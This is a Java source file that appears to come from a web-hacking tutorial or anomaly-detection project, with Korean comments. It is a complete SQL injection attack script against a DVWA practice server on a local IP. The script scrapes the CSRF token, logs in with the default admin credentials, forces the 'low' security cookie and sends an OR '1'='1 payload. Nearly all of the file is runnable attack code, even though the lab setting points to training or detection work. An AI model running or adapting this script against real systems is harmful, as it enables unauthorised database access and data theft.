package TrafficAnomalyDetection.FDS.WebHackingTutorial;

import java.io.*;
import java.net.*;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SQLInjectionTrial {

    public void SQLInjection() throws Exception {
        String loginUrl = "http://192.168.219.102/DVWA/login.php";
        String attackUrl = "http://192.168.219.102/DVWA/vulnerabilities/sqli/";

        // 1. CSRF 토큰 가져오기
        String csrfToken = getCSRFToken(loginUrl);
        if (csrfToken == null) {
            System.out.println("CSRF 토큰 가져오기 실패! 공격 중단");
            return;
        }
        System.out.println("CSRF 토큰: " + csrfToken);

        // 2. 로그인 후 세션 쿠키 가져오기
        String credentials = "username=admin&password=password&Login=Login&user_token=" + csrfToken;
        String sessionCookie = loginAndGetSession(loginUrl, credentials);
        if (sessionCookie == null) {
            System.out.println("로그인 실패! 공격 중단");
            return;
        }
        System.out.println("로그인 성공! 세션 쿠키: " + sessionCookie);

        // 3. SQL Injection 공격 요청 보내기
        String params = "id=1' OR '1'='1&Submit=Submit";
        sendAttack(attackUrl, params, sessionCookie);
    }

    // CSRF 토큰 가져오는 메서드
    public static String getCSRFToken(String url) throws Exception {
        URL loginPageUrl = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) loginPageUrl.openConnection();
        conn.setRequestMethod("GET");

        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        // 정규식을 이용해 CSRF 토큰 추출
        Pattern pattern = Pattern.compile("name='user_token' value='(.*?)'");
        Matcher matcher = pattern.matcher(response.toString());
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    // 로그인 후 세션 쿠키 가져오기
    public static String loginAndGetSession(String loginUrl, String credentials) throws Exception {
        URL url = new URL(loginUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(credentials.getBytes());
            os.flush();
        }

        // 응답 헤더에서 세션 쿠키 추출
        Map<String, List<String>> headerFields = conn.getHeaderFields();
        List<String> cookies = headerFields.get("Set-Cookie");

        if (cookies != null) {
            for (String cookie : cookies) {
                if (cookie.contains("PHPSESSID")) {
                    return cookie.split(";")[0] + "; security=low";  // 보안 설정 포함
                }
            }
        }
        return null;
    }

    // SQL Injection 공격 요청
    public static void sendAttack(String targetUrl, String params, String cookie) throws Exception {
        URL url = new URL(targetUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Cookie", cookie);
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(params.getBytes());
            os.flush();
        }

        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        System.out.println("공격 응답: " + response.toString());
    }
}